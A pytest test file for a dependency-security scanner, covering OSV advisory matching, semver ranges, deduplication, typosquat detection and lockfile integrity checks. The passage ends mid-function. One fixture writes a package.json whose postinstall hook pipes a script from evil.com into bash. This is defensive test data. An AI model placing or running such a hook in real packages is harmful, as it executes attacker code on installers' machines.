import pytest
from pathlib import Path
from modules.dependency_scanner.osv_client import (
    fixed_versions,
    is_version_affected,
    vuln_severity,
)
from modules.dependency_scanner.scanner import (
    deduplicate_advisories,
    run,
    MANIFEST_HINTS,
)
from modules.dependency_scanner.syft_runner import ECOSYSTEMS
from modules.dependency_scanner import heuristics as H
from modules.dependency_scanner.lockfiles import Pkg
from modules.dependency_scanner.registry import load_meta


def test_fixed_versions_package_name_filtering():
    """Ensure fixed_versions restricts event extraction to the target package name."""
    multi_package_vuln = {
        "id": "GO-2024-2687",
        "affected": [
            {
                "package": {"name": "stdlib", "ecosystem": "Go"},
                "ranges": [
                    {
                        "type": "SEMVER",
                        "events": [{"introduced": "0"}, {"fixed": "1.21.9"}, {"fixed": "1.22.2"}],
                    }
                ],
            },
            {
                "package": {"name": "golang.org/x/net", "ecosystem": "Go"},
                "ranges": [
                    {
                        "type": "SEMVER",
                        "events": [{"introduced": "0"}, {"fixed": "0.23.0"}],
                    }
                ],
            },
        ],
    }

    # Without package_name, all fixed versions across all components are returned
    all_fixes = fixed_versions(multi_package_vuln)
    assert "0.23.0" in all_fixes
    assert "1.21.9" in all_fixes

    # With package_name='stdlib', 0.23.0 from golang.org/x/net is cleanly excluded
    stdlib_fixes = fixed_versions(multi_package_vuln, package_name="stdlib")
    assert stdlib_fixes == ["1.21.9", "1.22.2"]
    assert "0.23.0" not in stdlib_fixes


def test_is_version_affected_logic():
    """Ensure semver range matching correctly evaluates introduced and fixed bounds."""
    affected_entry = {
        "package": {"name": "test-pkg"},
        "ranges": [
            {
                "type": "SEMVER",
                "events": [
                    {"introduced": "1.0.0"},
                    {"fixed": "1.2.0"},
                    {"introduced": "2.0.0"},
                    {"fixed": "2.1.5"},
                ],
            }
        ],
    }

    assert is_version_affected("1.0.0", affected_entry) is True
    assert is_version_affected("1.1.2", affected_entry) is True
    assert is_version_affected("1.2.0", affected_entry) is False
    assert is_version_affected("1.9.0", affected_entry) is False
    assert is_version_affected("2.0.0", affected_entry) is True
    assert is_version_affected("2.1.4", affected_entry) is True
    assert is_version_affected("2.1.5", affected_entry) is False
    assert is_version_affected("2.2.0", affected_entry) is False


def test_advisory_deduplication_starlette_and_pytest():
    """Ensure OSV records sharing common CVE or aliases are deduplicated."""
    # Starlette case: 2 records for the same CVE
    adv1 = {
        "id": "GHSA-2c2j-9gv5-cj73",
        "aliases": ["CVE-2025-54121", "PYSEC-2026-1941"],
        "summary": "Multipart stream parsing vulnerability in Starlette",
        "affected": [
            {
                "package": {"name": "starlette"},
                "ranges": [{"events": [{"introduced": "0"}, {"fixed": "0.47.2"}]}],
            }
        ],
    }
    adv2 = {
        "id": "PYSEC-2026-1941",
        "aliases": ["CVE-2025-54121", "GHSA-2c2j-9gv5-cj73"],
        "summary": "Starlette vulnerable to multipart stream parsing",
        "affected": [
            {
                "package": {"name": "starlette"},
                "ranges": [{"events": [{"introduced": "0"}, {"fixed": "0.47.2"}]}],
            }
        ],
    }

    deduped = deduplicate_advisories([adv1, adv2], package_name="starlette")
    assert len(deduped) == 1
    consolidated = deduped[0]
    assert consolidated["id"] == "GHSA-2c2j-9gv5-cj73"
    assert "CVE-2025-54121" in consolidated["aliases"]
    assert "PYSEC-2026-1941" in consolidated["aliases"]
    assert consolidated["_merged_fixed"] == ["0.47.2"]

    # Pytest case
    pt1 = {
        "id": "GHSA-6w46-j5rx-g56g",
        "aliases": ["CVE-2025-71176", "PYSEC-2026-1845"],
        "summary": "Temporary directory traversal in Pytest",
        "affected": [
            {
                "package": {"name": "pytest"},
                "ranges": [{"events": [{"introduced": "0"}, {"fixed": "9.0.3"}]}],
            }
        ],
    }
    pt2 = {
        "id": "PYSEC-2026-1845",
        "aliases": ["CVE-2025-71176", "GHSA-6w46-j5rx-g56g"],
        "summary": "Pytest tempdir issue",
        "affected": [
            {
                "package": {"name": "pytest"},
                "ranges": [{"events": [{"introduced": "0"}, {"fixed": "9.0.3"}]}],
            }
        ],
    }

    deduped_pt = deduplicate_advisories([pt1, pt2], package_name="pytest")
    assert len(deduped_pt) == 1
    assert deduped_pt[0]["id"] == "GHSA-6w46-j5rx-g56g"
    assert deduped_pt[0]["_merged_fixed"] == ["9.0.3"]


def test_ecosystem_nuget_and_go_support():
    """Ensure NuGet and Go ecosystems are mapped in ECOSYSTEMS and MANIFEST_HINTS."""
    assert ECOSYSTEMS.get("nuget") == "NuGet"
    assert ECOSYSTEMS.get("go") == "Go"
    assert ECOSYSTEMS.get("golang") == "Go"
    assert "nuget" in MANIFEST_HINTS
    assert "go" in MANIFEST_HINTS


def test_typosquatting_ecosystem_isolation_and_short_words():
    """Ensure typosquatting does not cross ecosystems and guards short words like 'read'."""
    npm_top = {"lodash", "react", "tslib", "chalk"}
    pypi_top = {"numpy", "flask", "requests"}

    # 4-letter npm package 'read' vs 'react' (dist 2): guarded by min(len) <= 4 limit
    assert H.typosquat("read", npm_top) is None

    # Cross-ecosystem: 'pump' (npm) should not match 'numpy' (pypi)
    assert H.typosquat("pump", npm_top) is None
    # 'slash' (npm) should not match 'flask' (pypi)
    assert H.typosquat("slash", npm_top) is None
    # 'stdlib' (go) should not match 'tslib' (npm)
    # stdlib has eco='golang', so it is not queried against npm_top

    # Legitimate typosquat still detected: 'lodahs' vs 'lodash'
    hit = H.typosquat("lodahs", npm_top)
    assert hit is not None
    assert hit[0] == "lodash"
    assert hit[1] == 1


def test_missing_integrity_only_on_lockfiles(tmp_path):
    """Ensure MISSING_INTEGRITY only fires for lockfile entries, not bare package.json."""
    pkg_json = tmp_path / "package.json"
    pkg_json.write_text(
        '{"name": "my-app", "dependencies": {"express": "4.18.2", "cors": "2.8.5"}}\n',
        encoding="utf-8",
    )

    result = run(tmp_path, {"offline": True})
    # express and cors in package.json must NOT trigger MISSING_INTEGRITY
    missing_integ = [
        f for f in result.findings
        if any(e.rule_id == "MISSING_INTEGRITY" for e in f.evidence)
    ]
    assert len(missing_integ) == 0


def test_missing_integrity_fires_for_lockfile_without_integrity(tmp_path):
    """Ensure MISSING_INTEGRITY fires for legitimate lockfile entries lacking an integrity hash."""
    lock_json = tmp_path / "package-lock.json"
    lock_json.write_text("""{
  "name": "my-app",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "packages": {
    "node_modules/untrusted-pkg": {
      "version": "1.0.0",
      "resolved": "https://registry.npmjs.org/untrusted-pkg/-/untrusted-pkg-1.0.0.tgz"
    }
  }
}""", encoding="utf-8")

    result = run(tmp_path, {"offline": True})
    missing_integ = [
        f for f in result.findings
        if any(e.rule_id == "MISSING_INTEGRITY" for e in f.evidence)
    ]
    assert len(missing_integ) == 1
    assert missing_integ[0].subject.get("name") == "untrusted-pkg"


def test_pipeline_typosquat_ecosystem_isolation_and_detection(tmp_path):
    """Ensure pipeline isolates ecosystems and detects lodahs without flagging pump, read, slash."""
    pkg_json = tmp_path / "package.json"
    pkg_json.write_text("""{
  "name": "my-app",
  "dependencies": {
    "pump": "3.0.4",
    "read": "1.0.7",
    "slash": "5.1.0",
    "lodahs": "1.0.0"
  }
}""", encoding="utf-8")

    result = run(tmp_path, {"offline": True})
    typos = {
        f.subject.get("name"): [e.data for e in f.evidence if e.rule_id == "TYPOSQUAT"]
        for f in result.findings
        if any(e.rule_id == "TYPOSQUAT" for e in f.evidence)
    }

    assert "pump" not in typos
    assert "read" not in typos
    assert "slash" not in typos
    assert "lodahs" in typos
    assert typos["lodahs"][0]["similar_to"] == "lodash"
    assert typos["lodahs"][0]["distance"] == 1


def test_monorepo_subfolder_load_meta_resolution(tmp_path):
    """Ensure load_meta resolves relative paths correctly for manifests in subdirectories."""
    sub_dir = tmp_path / "apps" / "frontend"
    vendor_dir = sub_dir / "vendor" / "helper"
    vendor_dir.mkdir(parents=True)
    (vendor_dir / "package.json").write_text(
        '{"name": "helper", "scripts": {"postinstall": "curl -s http://evil.com/x.sh | bash"}}\n',
        encoding="utf-8",
    )
    lock_file = sub_dir / "package-lock.json"
    lock_file.write_text("{}", encoding="utf-8")

    pkg = Pkg(
        eco="npm",
        name="helper",
        version="1.0.0",
        source="local",
        local_dir="vendor/helper",
        manifest=str(lock_file),
    )

    # load_meta with project=tmp_path (repo root) should locate vendor/helper under apps/frontend
    meta = load_meta(pkg, tmp_path, offline=True)
    assert "scripts" in meta
    assert "postinstall" in meta["scripts"]
    assert "curl" in meta["scripts"]["postinstall"]


def test_resolve_build_target(tmp_path):
    """Ensure _resolve_build_target locates the build recipe across targets and samples."""
    from backend.orchestrator import _resolve_build_target, REPO_ROOT

    # 1. Target with its own recipe
    proj_with_recipe = tmp_path / "custom_proj"
    proj_with_recipe.mkdir()
    (proj_with_recipe / "buildguard.yml").write_text("version: 1\n", encoding="utf-8")
    assert _resolve_build_target({}, proj_with_recipe) == str(proj_with_recipe)

    # 2. Configured compiler_sample within project with recipe
    proj_no_recipe = tmp_path / "empty_proj"
    proj_no_recipe.mkdir()
    sample_dir = proj_no_recipe / "sample_c"
    sample_dir.mkdir()
    (sample_dir / "buildguard.yml").write_text("version: 1\n", encoding="utf-8")
    options = {"compiler_sample": "sample_c"}
    assert _resolve_build_target(options, proj_no_recipe) == str(sample_dir)

    # 3. Explicit compiler_sample on repo root selects sample
    repo_build_target = _resolve_build_target({"compiler_sample": "test_samples/compiler_hello"}, REPO_ROOT)
    expected_sample = str(REPO_ROOT / "test_samples" / "compiler_hello")
    assert repo_build_target == expected_sample

    # 4. No recipe and no sample retains project path
    assert _resolve_build_target({}, proj_no_recipe) == str(proj_no_recipe)


def test_syft_runner_exclude_flags_and_timeout(monkeypatch, tmp_path):
    """Ensure run_syft excludes caches and respects timeout."""
    import subprocess
    from modules.dependency_scanner.syft_runner import run_syft

    recorded_cmd = []
    recorded_timeout = []

    def mock_run(cmd, *args, **kwargs):
        recorded_cmd.extend(cmd)
        recorded_timeout.append(kwargs.get("timeout"))
        for arg in cmd:
            if arg.startswith("cyclonedx-json="):
                out_file = Path(arg.split("=")[1])
                out_file.write_text('{"bomFormat": "CycloneDX", "specVersion": "1.4", "components": []}', encoding="utf-8")
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    monkeypatch.setattr(subprocess, "run", mock_run)

    out_json = tmp_path / "out.json"
    run_syft(str(tmp_path), str(out_json), timeout=42)

    assert "--exclude" in recorded_cmd
    assert "**/.git/**" in recorded_cmd
    assert "**/.buildguard/**" in recorded_cmd
    assert recorded_timeout == [42]


def test_compiler_lab_adapter_bash_invocation(monkeypatch, tmp_path):
    """Ensure run_lab invokes lab_run.sh via bash with mounted script."""
    from modules.compiler_analysis import lab_adapter

    recorded_call = {}

    def mock_run_container(image, cmd, mounts=None, env=None, network_none=True, timeout=180):
        recorded_call["image"] = image
        recorded_call["cmd"] = cmd
        recorded_call["mounts"] = mounts
        recorded_call["timeout"] = timeout
        class Res:
            returncode = 0
            exit_code = 0
            stdout = ""
            stderr = ""
        return Res()

    monkeypatch.setattr(lab_adapter.dr, "run_container", mock_run_container)

    sample = tmp_path / "sample"
    sample.mkdir()
    out = tmp_path / "out"
    out.mkdir()

    lab_adapter.run_lab(sample, out)

    assert recorded_call["cmd"] == ["bash", "/usr/local/bin/lab_run.sh"]
    mount_targets = [m[1] for m in recorded_call["mounts"]]
    assert "/usr/local/bin/lab_run.sh" in mount_targets
    assert "/work/sample" in mount_targets
    assert "/out" in mount_targets


def test_scan_pipeline_pytest_deduplication(tmp_path, monkeypatch):
    """Ensure the full scan pipeline merges duplicate OSV advisories for pytest into 1 finding."""
    from modules.dependency_scanner.osv_client import OSVClient

    req = tmp_path / "requirements.txt"
    req.write_text("pytest==8.3.4\n", encoding="utf-8")

    adv1 = {
        "id": "GHSA-6w46-j5rx-g56g",
        "aliases": ["CVE-2025-71176", "PYSEC-2026-1845"],
        "summary": "Temporary directory traversal in Pytest",
        "database_specific": {"severity": "HIGH"},
        "affected": [
            {
                "package": {"name": "pytest", "ecosystem": "PyPI"},
                "ranges": [{"events": [{"introduced": "0"}, {"fixed": "9.0.3"}]}],
            }
        ],
    }
    adv2 = {
        "id": "PYSEC-2026-1845",
        "aliases": ["CVE-2025-71176", "GHSA-6w46-j5rx-g56g"],
        "summary": "Pytest tempdir issue",
        "database_specific": {"severity": "HIGH"},
        "affected": [
            {
                "package": {"name": "pytest", "ecosystem": "PyPI"},
                "ranges": [{"events": [{"introduced": "0"}, {"fixed": "9.0.3"}]}],
            }
        ],
    }

    def mock_query_ids(self, packages):
        output = {}
        for p in packages:
            output[p] = ["GHSA-6w46-j5rx-g56g", "PYSEC-2026-1845"]
        return output, []

    def mock_get_vuln(self, vuln_id):
        if vuln_id == "GHSA-6w46-j5rx-g56g":
            return adv1
        if vuln_id == "PYSEC-2026-1845":
            return adv2
        return {"id": vuln_id}

    monkeypatch.setattr(OSVClient, "query_ids", mock_query_ids)
    monkeypatch.setattr(OSVClient, "get_vuln", mock_get_vuln)

    result = run(tmp_path, {"offline": False})
    pytest_findings = [f for f in result.findings if f.subject.get("name") == "pytest"]

    # Must be merged into exactly 1 finding, not 2
    assert len(pytest_findings) == 1
    f = pytest_findings[0]
    assert f.category == "KNOWN_VULNERABILITY"
    assert len(f.evidence) == 1
    ev_data = f.evidence[0].data
    assert ev_data["id"] == "GHSA-6w46-j5rx-g56g"
    assert "PYSEC-2026-1845" in ev_data["aliases"]
    assert "9.0.3" in ev_data["fixed_in"]


def test_monorepo_ancestor_lockfile_deduplication(tmp_path):
    """Ensure subfolder package.json does not flag missing integrity when locked in root lockfile."""
    # Write a root package-lock.json locking @types/node
    root_lock = tmp_path / "package-lock.json"
    root_lock.write_text("""{
  "name": "my-monorepo",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "packages": {
    "node_modules/@types/node": {
      "version": "20.17.0",
      "resolved": "https://registry.npmjs.org/@types/node/-/node-20.17.0.tgz",
      "integrity": "sha512-valid-sha512"
    }
  }
}""", encoding="utf-8")

    sub_dir = tmp_path / "extension"
    sub_dir.mkdir()
    sub_pkg = sub_dir / "package.json"
    sub_pkg.write_text("""{
  "name": "my-extension",
  "devDependencies": {
    "@types/node": "^20.17.0"
  }
}""", encoding="utf-8")

    result = run(tmp_path, {"offline": True})
    missing_integ = [
        f for f in result.findings
        if any(e.rule_id == "MISSING_INTEGRITY" for e in f.evidence)
    ]
    assert len(missing_integ) == 0


def test_semver_boundaries_and_prerelease_comparison():
    """Verify SemVer boundary conditions: introduced (inclusive), fixed (exclusive),
    last_affected (inclusive), multiple intervals, and prerelease precedence."""
    # 1. Single range introduced and fixed
    entry = {
        "ranges": [
            {
                "type": "SEMVER",
                "events": [{"introduced": "1.0.0"}, {"fixed": "1.2.0"}],
            }
        ]
    }
    # Introduced version is affected
    assert is_version_affected("1.0.0", entry) is True
    # Version immediately before fixed version is affected
    assert is_version_affected("1.1.9", entry) is True
    assert is_version_affected("1.1.99", entry) is True
    # Fixed version itself is NOT affected
    assert is_version_affected("1.2.0", entry) is False
    # Version beyond fixed is NOT affected
    assert is_version_affected("1.2.1", entry) is False
    # Version before introduced is NOT affected
    assert is_version_affected("0.9.9", entry) is False

    # 2. last_affected is inclusive
    entry_last = {
        "ranges": [
            {
                "type": "SEMVER",
                "events": [{"introduced": "1.0.0"}, {"last_affected": "1.2.0"}],
            }
        ]
    }
    assert is_version_affected("1.2.0", entry_last) is True
    assert is_version_affected("1.2.1", entry_last) is False

    # 3. Multiple introduced/fixed ranges
    entry_multi = {
        "ranges": [
            {
                "type": "SEMVER",
                "events": [
                    {"introduced": "1.0.0"},
                    {"fixed": "1.2.0"},
                    {"introduced": "2.0.0"},
                    {"fixed": "2.5.0"},
                ],
            }
        ]
    }
    assert is_version_affected("1.1.0", entry_multi) is True
    assert is_version_affected("1.5.0", entry_multi) is False
    assert is_version_affected("2.0.0", entry_multi) is True
    assert is_version_affected("2.4.9", entry_multi) is True
    assert is_version_affected("2.5.0", entry_multi) is False

    # 4. Valid prerelease comparisons
    entry_pre = {
        "ranges": [
            {
                "type": "SEMVER",
                "events": [{"introduced": "1.0.0-alpha"}, {"fixed": "1.0.0"}],
            }
        ]
    }
    assert is_version_affected("1.0.0-alpha", entry_pre) is True
    assert is_version_affected("1.0.0-alpha.1", entry_pre) is True
    assert is_version_affected("1.0.0-beta", entry_pre) is True
    assert is_version_affected("1.0.0-rc.1", entry_pre) is True
    assert is_version_affected("1.0.0", entry_pre) is False


def test_go_pseudo_version_comparison():
    """Verify Go pseudo-versions are parsed and compared correctly without falling back to True."""
    pseudo = "v0.0.0-20220715151400-c0bba94af5f8"

    # Older than 0.44.0: affected when introduced: 0, fixed: 0.44.0
    entry_aff = {
        "ranges": [
            {
                "type": "SEMVER",
                "events": [{"introduced": "0"}, {"fixed": "0.44.0"}],
            }
        ]
    }
    assert is_version_affected(pseudo, entry_aff) is True

    # Not older than 0.44.0: unaffected when introduced: 0.44.0
    entry_unaff = {
        "ranges": [
            {
                "type": "SEMVER",
                "events": [{"introduced": "0.44.0"}],
            }
        ]
    }
    # Must NOT fall back to True!
    assert is_version_affected(pseudo, entry_unaff) is False

    # Unaffected when range is 0.10.0 to 0.44.0
    entry_range = {
        "ranges": [
            {
                "type": "SEMVER",
                "events": [{"introduced": "0.10.0"}, {"fixed": "0.44.0"}],
            }
        ]
    }
    assert is_version_affected(pseudo, entry_range) is False


def test_indeterminate_uncertainty_results():
    """Verify indeterminate cases return None rather than defaulting to True."""
    # 1. Invalid version string
    valid_range = {
        "ranges": [
            {
                "type": "SEMVER",
                "events": [{"introduced": "1.0.0"}, {"fixed": "2.0.0"}],
            }
        ]
    }
    assert is_version_affected("not-a-semver", valid_range) is None
    assert is_version_affected("", valid_range) is None
    assert is_version_affected(None, valid_range) is None

    # 2. Unsupported range type (ECOSYSTEM or GIT only, no SEMVER)
    eco_only = {
        "ranges": [
            {
                "type": "ECOSYSTEM",
                "events": [{"introduced": "0"}, {"fixed": "2.0.0"}],
            }
        ]
    }
    assert is_version_affected("1.5.0", eco_only) is None

    git_only = {
        "ranges": [
            {
                "type": "GIT",
                "events": [{"introduced": "abc123"}, {"fixed": "def456"}],
            }
        ]
    }
    assert is_version_affected("1.5.0", git_only) is None

    # 3. Malformed range events
    malformed_intro = {
        "ranges": [
            {
                "type": "SEMVER",
                "events": [{"introduced": "invalid_boundary"}, {"fixed": "2.0.0"}],
            }
        ]
    }
    assert is_version_affected("1.5.0", malformed_intro) is None

    malformed_fix = {
        "ranges": [
            {
                "type": "SEMVER",
                "events": [{"introduced": "1.0.0"}, {"fixed": "invalid_fixed"}],
            }
        ]
    }
    assert is_version_affected("1.5.0", malformed_fix) is None

    # 4. Missing usable range/version data
    assert is_version_affected("1.5.0", {}) is None
    assert is_version_affected("1.5.0", {"ranges": []}) is None
    assert is_version_affected("1.5.0", {"ranges": [{"type": "SEMVER", "events": []}]}) is None


def test_scanner_pipeline_package_identity_filtering(tmp_path, monkeypatch):
    """Ensure an advisory with named affected package is NOT attached if it does not match installed package."""
    from modules.dependency_scanner.osv_client import OSVClient

    req = tmp_path / "requirements.txt"
    req.write_text("my-pkg==1.0.0\n", encoding="utf-8")

    adv_different_pkg = {
        "id": "GHSA-xxxx-yyyy-zzzz",
        "summary": "Advisory for unrelated other-pkg",
        "affected": [
            {
                "package": {"name": "other-pkg", "ecosystem": "PyPI"},
                "ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}, {"fixed": "2.0.0"}]}],
            }
        ],
    }

    monkeypatch.setattr(OSVClient, "query_ids", lambda self, pkgs: ({p: ["GHSA-xxxx-yyyy-zzzz"] for p in pkgs}, []))
    monkeypatch.setattr(OSVClient, "get_vuln", lambda self, vid: adv_different_pkg)

    result = run(tmp_path, {"offline": False})
    findings = [f for f in result.findings if f.subject.get("name") == "my-pkg"]
    # Should not attach GHSA-xxxx-yyyy-zzzz to my-pkg
    vuln_findings = [f for f in findings if f.category in ("KNOWN_VULNERABILITY", "KNOWN_MALICIOUS_ADVISORY")]
    assert len(vuln_findings) == 0


def test_scanner_pipeline_indeterminate_uncertainty_handling(tmp_path, monkeypatch):
    """Ensure indeterminate advisory generates an UNRESOLVED finding with version_comparison_unknown."""
    from modules.dependency_scanner.osv_client import OSVClient

    req = tmp_path / "requirements.txt"
    req.write_text("my-pkg==1.0.0\n", encoding="utf-8")

    # Advisory only has ECOSYSTEM range, cannot be reliably evaluated against SEMVER
    adv_indeterminate = {
        "id": "PYSEC-2026-9999",
        "summary": "Indeterminate ecosystem advisory",
        "affected": [
            {
                "package": {"name": "my-pkg", "ecosystem": "PyPI"},
                "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}]}],
            }
        ],
    }

    monkeypatch.setattr(OSVClient, "query_ids", lambda self, pkgs: ({p: ["PYSEC-2026-9999"] for p in pkgs}, []))
    monkeypatch.setattr(OSVClient, "get_vuln", lambda self, vid: adv_indeterminate)

    result = run(tmp_path, {"offline": False})
    my_pkg_findings = [f for f in result.findings if f.subject.get("name") == "my-pkg"]

    # Must NOT become a CONFIRMED KNOWN_VULNERABILITY
    confirmed_findings = [f for f in my_pkg_findings if f.category == "KNOWN_VULNERABILITY"]
    assert len(confirmed_findings) == 0

    # Must be an UNRESOLVED finding with reason version_comparison_unknown
    unresolved_findings = [f for f in my_pkg_findings if f.category == "UNRESOLVED"]
    assert len(unresolved_findings) == 1
    unresolved = unresolved_findings[0]
    assert unresolved.confidence == "LOW"
    assert unresolved.severity == "INFO"
    assert any(e.data.get("reason") == "version_comparison_unknown" for e in unresolved.evidence)
    assert any(e.data.get("id") == "PYSEC-2026-9999" for e in unresolved.evidence)


def test_scanner_pipeline_confirmed_vs_unaffected(tmp_path, monkeypatch):
    """Ensure confirmed version within range produces KNOWN_VULNERABILITY and outside range produces none."""
    from modules.dependency_scanner.osv_client import OSVClient

    # Package 1 is affected (1.5.0 < 2.0.0)
    # Package 2 is unaffected (3.0.0 >= 2.0.0)
    req = tmp_path / "requirements.txt"
    req.write_text("pkg-one==1.5.0\npkg-two==3.0.0\n", encoding="utf-8")

    adv = {
        "id": "GHSA-test-vuln-1",
        "summary": "Test vulnerability for pkg-one and pkg-two",
        "affected": [
            {
                "package": {"name": "pkg-one", "ecosystem": "PyPI"},
                "ranges": [{"type": "SEMVER", "events": [{"introduced": "1.0.0"}, {"fixed": "2.0.0"}]}],
            },
            {
                "package": {"name": "pkg-two", "ecosystem": "PyPI"},
                "ranges": [{"type": "SEMVER", "events": [{"introduced": "1.0.0"}, {"fixed": "2.0.0"}]}],
            },
        ],
    }

    monkeypatch.setattr(OSVClient, "query_ids", lambda self, pkgs: ({p: ["GHSA-test-vuln-1"] for p in pkgs}, []))
    monkeypatch.setattr(OSVClient, "get_vuln", lambda self, vid: adv)

    result = run(tmp_path, {"offline": False})

    # pkg-one should have confirmed vulnerability
    pkg1_vulns = [f for f in result.findings if f.subject.get("name") == "pkg-one" and f.category == "KNOWN_VULNERABILITY"]
    assert len(pkg1_vulns) == 1
    assert pkg1_vulns[0].confidence == "CONFIRMED"

    # pkg-two should have NO vulnerability findings and NO unresolved findings
    pkg2_findings = [f for f in result.findings if f.subject.get("name") == "pkg-two"]
    assert len(pkg2_findings) == 0


def test_versionless_package_osv_confidence_handling(tmp_path, monkeypatch):
    """
    Ensure:
    1. Versionless package + advisory without affected details -> UNRESOLVED, never KNOWN_VULNERABILITY.
    2. Versioned package + same advisory without affected details -> CONFIRMED KNOWN_VULNERABILITY.
    3. Versioned package + explicitly unaffected range -> no vulnerability finding.
    4. Indeterminate finding explains installed version unavailable in detail and retains id + summary.
    """
    from modules.dependency_scanner.osv_client import OSVClient

    req = tmp_path / "requirements.txt"
    req.write_text(
        "unpinned-pkg>=1.0.0\n"
        "versioned-pkg==1.0.0\n"
        "unaffected-pkg==3.0.0\n",
        encoding="utf-8",
    )

    adv_no_affected = {
        "id": "GHSA-no-aff-1",
        "summary": "Advisory with no affected entries",
    }

    adv_unaffected_range = {
        "id": "GHSA-range-1",
        "summary": "Range advisory 1.0.0 to 2.0.0",
        "affected": [
            {
                "package": {"name": "unaffected-pkg", "ecosystem": "PyPI"},
                "ranges": [{"type": "SEMVER", "events": [{"introduced": "1.0.0"}, {"fixed": "2.0.0"}]}],
            }
        ],
    }

    def mock_query_ids(self, pkgs):
        results = {}
        for eco, name, ver in pkgs:
            if name == "unpinned-pkg":
                results[(eco, name, ver)] = ["GHSA-no-aff-1"]
            elif name == "versioned-pkg":
                results[(eco, name, ver)] = ["GHSA-no-aff-1"]
            elif name == "unaffected-pkg":
                results[(eco, name, ver)] = ["GHSA-range-1"]
        return results, []

    def mock_get_vuln(self, vid):
        if vid == "GHSA-no-aff-1":
            return adv_no_affected
        elif vid == "GHSA-range-1":
            return adv_unaffected_range
        raise KeyError(vid)

    monkeypatch.setattr(OSVClient, "query_ids", mock_query_ids)
    monkeypatch.setattr(OSVClient, "get_vuln", mock_get_vuln)

    result = run(tmp_path, {"offline": False})

    # 1. Versionless package checks:
    unpinned_vulns = [
        f for f in result.findings
        if f.subject.get("name") == "unpinned-pkg" and f.category in ("KNOWN_VULNERABILITY", "KNOWN_MALICIOUS_ADVISORY")
    ]
    # Never KNOWN_VULNERABILITY for versionless package
    assert len(unpinned_vulns) == 0

    unpinned_unresolved = [
        f for f in result.findings
        if f.subject.get("name") == "unpinned-pkg" and f.category == "UNRESOLVED"
    ]
    # Should have no_exact_version finding AND indeterminate OSV finding
    indeterminate_finding = next(
        (f for f in unpinned_unresolved if any(e.data.get("reason") == "version_comparison_unknown" for e in f.evidence)),
        None,
    )
    assert indeterminate_finding is not None
    assert indeterminate_finding.confidence == "LOW"
    assert indeterminate_finding.severity == "INFO"

    ev = next(e for e in indeterminate_finding.evidence if e.data.get("reason") == "version_comparison_unknown")
    assert ev.data.get("id") == "GHSA-no-aff-1"
    assert ev.data.get("summary") == "Advisory with no affected entries"
    assert "Installed version is unavailable and version-specific vulnerability verification could not be performed" in ev.data.get("detail", "")

    # 2. Versioned package with same advisory:
    versioned_vulns = [
        f for f in result.findings
        if f.subject.get("name") == "versioned-pkg" and f.category == "KNOWN_VULNERABILITY"
    ]
    assert len(versioned_vulns) == 1
    assert versioned_vulns[0].confidence == "CONFIRMED"
    assert any(e.data.get("id") == "GHSA-no-aff-1" for e in versioned_vulns[0].evidence)

    # 3. Versioned package with unaffected range:
    unaffected_findings = [
        f for f in result.findings
        if f.subject.get("name") == "unaffected-pkg"
    ]
    # No vulnerability findings and no indeterminate findings
    assert len(unaffected_findings) == 0


def test_versionless_package_with_empty_affected_list_or_unparseable_ranges(tmp_path, monkeypatch):
    """Ensure versionless package with affected list containing no ranges also routes to UNRESOLVED."""
    from modules.dependency_scanner.osv_client import OSVClient

    req = tmp_path / "requirements.txt"
    req.write_text("pkg-unpinned\n", encoding="utf-8")

    adv_empty_ranges = {
        "id": "GHSA-empty-ranges",
        "summary": "Advisory with affected list but no ranges",
        "affected": [
            {
                "package": {"name": "pkg-unpinned", "ecosystem": "PyPI"},
                # no ranges
            }
        ],
    }

    monkeypatch.setattr(OSVClient, "query_ids", lambda self, pkgs: ({p: ["GHSA-empty-ranges"] for p in pkgs}, []))
    monkeypatch.setattr(OSVClient, "get_vuln", lambda self, vid: adv_empty_ranges)

    result = run(tmp_path, {"offline": False})

    vulns = [f for f in result.findings if f.subject.get("name") == "pkg-unpinned" and f.category in ("KNOWN_VULNERABILITY", "KNOWN_MALICIOUS_ADVISORY")]
    assert len(vulns) == 0

    unresolved = [f for f in result.findings if f.subject.get("name") == "pkg-unpinned" and f.category == "UNRESOLVED"]
    indeterminate = [f for f in unresolved if any(e.data.get("reason") == "version_comparison_unknown" for e in f.evidence)]
    assert len(indeterminate) == 1
    ev = indeterminate[0].evidence[0]
    assert ev.data.get("id") == "GHSA-empty-ranges"
    assert "Installed version is unavailable and version-specific vulnerability verification could not be performed" in ev.data.get("detail", "")


def test_offline_scan_versionless_package_cached_hit(tmp_path):
    """Ensure an offline scan can use a cached OSV result for a versionless package."""
    from modules.dependency_scanner.osv_client import OSVClient

    proj_dir = tmp_path / "proj"
    proj_dir.mkdir()
    req = proj_dir / "requirements.txt"
    req.write_text("cached-unpinned\n", encoding="utf-8")

    cache_dir = tmp_path / "cache"
    cache_dir.mkdir()

    client = OSVClient(cache_dir, offline=True)
    pkg_key = client._pkg_key(("PyPI", "cached-unpinned", None))
    client._write("q", pkg_key, ["GHSA-offline-cached-1"])
    client._write("v", "GHSA-offline-cached-1", {
        "id": "GHSA-offline-cached-1",
        "summary": "Cached offline advisory for unpinned package",
    })

    result = run(proj_dir, {"offline": True, "osv_cache_dir": str(cache_dir)})

    assert "osv_lookup" in result.checks_performed
    assert result.status == "ok"

    unresolved = [f for f in result.findings if f.subject.get("name") == "cached-unpinned" and f.category == "UNRESOLVED"]
    # Should have no_exact_version and the indeterminate cached finding, but NOT osv_unreachable
    reasons = [e.data.get("reason") for f in unresolved for e in f.evidence]
    assert "no_exact_version" in reasons
    assert "version_comparison_unknown" in reasons
    assert "osv_unreachable" not in reasons

    cached_ev = next(e for f in unresolved for e in f.evidence if e.data.get("reason") == "version_comparison_unknown")
    assert cached_ev.data.get("id") == "GHSA-offline-cached-1"
    assert cached_ev.data.get("summary") == "Cached offline advisory for unpinned package"
    assert "Installed version is unavailable and version-specific vulnerability verification could not be performed" in cached_ev.data.get("detail", "")

    # Must never be marked as confirmed KNOWN_VULNERABILITY
    vulns = [f for f in result.findings if f.subject.get("name") == "cached-unpinned" and f.category in ("KNOWN_VULNERABILITY", "KNOWN_MALICIOUS_ADVISORY")]
    assert len(vulns) == 0


def test_offline_scan_versionless_package_cache_miss_reported_as_unresolved(tmp_path):
    """Ensure an offline cache miss for a versionless package is reported as unresolved, not silently skipped."""
    proj_dir = tmp_path / "proj_miss"
